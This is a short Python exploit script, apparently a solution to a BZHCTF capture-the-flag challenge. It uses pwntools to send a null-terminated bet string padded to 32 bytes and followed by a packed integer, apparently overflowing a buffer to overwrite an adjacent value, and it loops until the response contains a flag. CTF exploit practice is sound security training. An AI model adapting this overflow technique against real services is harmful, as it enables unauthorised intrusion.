from pwn import *
import sys
import re

def main(ip, port):
    r = connect(ip, port)
    r.recvuntil(b"Votre mise : ")
    r.sendline(b"pair\x00".ljust(32, b"A") + p32(0x1337-2))
    try:
        res = r.recvall(timeout=1)
    except:
        res = b""
    r.close()

    m = re.findall(rb"BZHCTF{.*}", res)
    if m:
        return m[0]
    return None


if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    flag = None
    while not flag:
        print(".", end="", flush=True)
        flag = main(ip, port)

    print(flag)
